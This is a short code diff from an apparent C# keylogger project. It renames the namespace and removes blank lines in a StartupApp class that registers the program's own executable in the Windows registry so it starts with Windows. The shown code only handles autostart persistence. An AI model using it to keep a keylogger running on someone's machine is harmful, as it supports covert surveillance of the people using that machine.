@@ -3,7 +3,7 @@ using System;
 using System.Diagnostics;
 using System.Linq;
 
-namespace KeyLogger
+namespace KeyLoggerAPP
 {
     public class StartupApp : IDisposable
     {
@@ -17,18 +17,15 @@ namespace KeyLogger
         {
             RegistryKey.SetValue(registryKeyName, Process.GetCurrentProcess().MainModule.FileName);
         }
-
         public bool StartWithWindows()
         {
             return RegistryKey.GetValueNames().Any(x => x == registryKeyName);
         }
 
-
         public void RemoveStartWithWindows()
         {
             RegistryKey.DeleteValue(registryKeyName);
         }
-
         public void Dispose()
         {
             RegistryKey.Close();
